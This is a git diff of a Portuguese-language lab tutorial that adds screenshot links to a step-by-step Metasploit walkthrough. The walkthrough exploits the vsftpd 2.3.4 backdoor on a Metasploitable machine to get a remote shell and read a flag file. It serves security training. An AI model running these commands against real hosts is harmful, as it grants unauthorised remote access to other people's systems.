@@ -32,7 +32,7 @@ Comando para excluir arquivos: rm nome_do_arquivo.txt
 
 ### 3º - No Terminal no Kali Linux, iniciar o Metasploit através do comando: msfconsole
 
-![]()
+![mfsconsole](https://i.imgur.com/LEHJmfo.jpeg)
 
 &nbsp;
 
@@ -40,7 +40,7 @@ Comando para excluir arquivos: rm nome_do_arquivo.txt
 
 Comando: search vsftpd
 
-![]()
+![search vsftpd](https://i.imgur.com/YhJQuCH.jpeg)
 
 &nbsp;
 
@@ -48,7 +48,7 @@ Comando: search vsftpd
 
 Comando: info exploit/unix/ftp/vsftpd_234_backdoor
 
-![]()
+![info exploit](https://i.imgur.com/uXdMYKK.jpeg)
 
 &nbsp;
 
@@ -56,7 +56,7 @@ Comando: info exploit/unix/ftp/vsftpd_234_backdoor
 
 Comando: use exploit/unix/ftp/vsftpd_234_backdoor
 
-![]()
+![use exploit](https://i.imgur.com/p2ko8Zm.jpeg)
 
 &nbsp;
 
@@ -64,7 +64,7 @@ Comando: use exploit/unix/ftp/vsftpd_234_backdoor
 
 Comando: show options
 
-![]()
+![show options](https://i.imgur.com/7CHtCYo.jpeg)
 
 &nbsp;
 
@@ -72,7 +72,7 @@ Comando: show options
 
 Comando: ip addr
 
-![]()
+![ip addr](https://i.imgur.com/lkG0CDH.jpeg)
 
 &nbsp;
 
@@ -82,7 +82,7 @@ Comando: set rhosts nú.me.ro.ip
 
 Obs. rhosts é referente a remote hosts.
 
-![]()
+![set rhosts](https://i.imgur.com/SVnqsKY.jpeg)
 
 &nbsp;
 
@@ -92,7 +92,7 @@ Comando: show payloads
 
 Com este comando encontramos o nome do payload e descobrimos que ele é um comando Unix e que interage com conexão estabelecida, ou seja, consigo de forma remota acessar um outro computador explorando backdoor. 
 
-![]()
+![show payloads](https://i.imgur.com/gah2b12.jpeg)
 
 &nbsp;
 
@@ -100,7 +100,7 @@ Com este comando encontramos o nome do payload e descobrimos que ele é um coman
 
 Comando: set payload payload/cmd/unix/interact
 
-![]()
+![set payload](https://i.imgur.com/8Uy0MYp.jpeg)
 
 &nbsp;
 
@@ -108,7 +108,7 @@ Comando: set payload payload/cmd/unix/interact
 
 Comando: show options
 
-![]()
+![ip configurado](https://i.imgur.com/GWkb2YB.jpeg)
 
 &nbsp;
 
@@ -116,7 +116,7 @@ Comando: show options
 
 Comando: exploit
 
-![]() 
+![exploit](https://i.imgur.com/uMp54za.jpeg) 
 
 &nbsp;
 
@@ -124,7 +124,7 @@ Comando: exploit
 
 Comando: ip addr
 
-![]() 
+![ip kali](https://i.imgur.com/KPa6WlP.jpeg) 
 
 &nbsp;
 
@@ -137,8 +137,8 @@ Comando: cd msfadmin (entramos na pasta msfadmin)
 Comando: ls (encontramos o arquivo criado no metasploitable que foi nomeado como flag.txt)
 Comando: nano flag.txt (Abrimos e visualizamos o conteúdo do arquivo) 
 
-![]() 
+![encontrando arquivo](https://i.imgur.com/rlXmxog.jpeg) 
 
-![]()
+![acessando arquivo](https://i.imgur.com/hfUMslV.jpeg)
 
 &nbsp;
